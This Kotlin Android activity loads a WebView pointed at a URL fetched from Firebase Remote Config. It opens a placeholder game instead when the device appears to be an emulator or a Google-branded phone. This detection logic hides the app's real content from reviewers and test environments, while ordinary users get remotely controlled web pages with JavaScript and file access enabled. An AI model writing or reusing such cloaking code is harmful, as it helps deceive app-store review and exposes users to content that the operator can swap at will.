package jiharp.asembleya.app

import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.BuildConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import java.util.Locale


class MainActivity : AppCompatActivity() {
    private val TAG = "debug tag"
    private var webView: WebView? = null
    private var url: String? = null
    private lateinit var firebaseRemoteConfig: FirebaseRemoteConfig

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        webView?.saveState(outState)
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        webView?.restoreState(savedInstanceState)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // for debug
//        SharedPreferencesHelper.setUrl(this, "")
//        openPlaceholder()

        // Инициализация Firebase Remote Config
        firebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(3600)
            .build()
        firebaseRemoteConfig.setConfigSettingsAsync(configSettings)

        // Проверка, сохранена ли ссылка на устройстве
        if (SharedPreferencesHelper.getUrl(this) == null || SharedPreferencesHelper.getUrl(this) == "") {
            firebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        url = firebaseRemoteConfig.getString("url")
                        SharedPreferencesHelper.setUrl(this, url.toString())
                        openWebView(savedInstanceState)
                    } else {
                        Log.v(TAG, "Error firebase")
                    }
                }
        } else {
            if (!isInternetAvailable()) {
                showNoInternetDialog()
            } else {
                url = SharedPreferencesHelper.getUrl(this)
                openWebView(savedInstanceState)
            }
        }
    }

    private fun openWebView(savedInstanceState: Bundle?) {
        if (url.isNullOrEmpty() || isEmulatorOrGoogleDevice()) {
            openPlaceholder()
        } else {
            webView = findViewById(R.id.webView)
            webView!!.webViewClient = WebViewClient()
            val webSettings = webView!!.settings
            webSettings.apply {
                javaScriptEnabled = true
                loadWithOverviewMode = true
                useWideViewPort = true
                domStorageEnabled = true
                databaseEnabled = true
                setSupportZoom(false)
                allowFileAccess = true
                allowContentAccess = true
            }
            if (savedInstanceState != null) webView!!.restoreState(savedInstanceState) else webView!!.loadUrl(url!!)

            webView!!.settings.apply {
                domStorageEnabled = true
                javaScriptCanOpenWindowsAutomatically = true
            }

            val cookieManager = CookieManager.getInstance()
            cookieManager.setAcceptCookie(true)
        }
    }

    override fun onBackPressed() {
        if (webView!!.canGoBack()) {
            webView!!.goBack()
        }
    }

    private fun openPlaceholder() {
        val blankIntent = Intent(this, GameActivity::class.java)
        this.startActivity(blankIntent)
    }

    // Функция для проверки наличия интернет-соединения
    private fun isInternetAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    // Функция для отображения диалогового окна об отсутствии интернета
    private fun showNoInternetDialog() {
        val builder = AlertDialog.Builder(this)
        builder.setTitle("Отсутствует интернет-соединение")
        builder.setMessage("Пожалуйста, включите интернет и попробуйте снова.")
        builder.setPositiveButton("OK") { dialog: DialogInterface, _: Int ->
            dialog.dismiss()
            finish() // Закрыть активность или выполнить другие действия
        }
        val alertDialog = builder.create()
        alertDialog.show()
    }

    private fun isEmulatorOrGoogleDevice(): Boolean {
        if (BuildConfig.DEBUG) return false // когда разработчик использует отладку на эмуляторе

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || brand.contains("Genymotion")
                || buildHardware == "goldfish"
                || brand.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true

        result = result || (brand.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true

        result = result || ("google_sdk" == buildProduct)
        return result
    }

}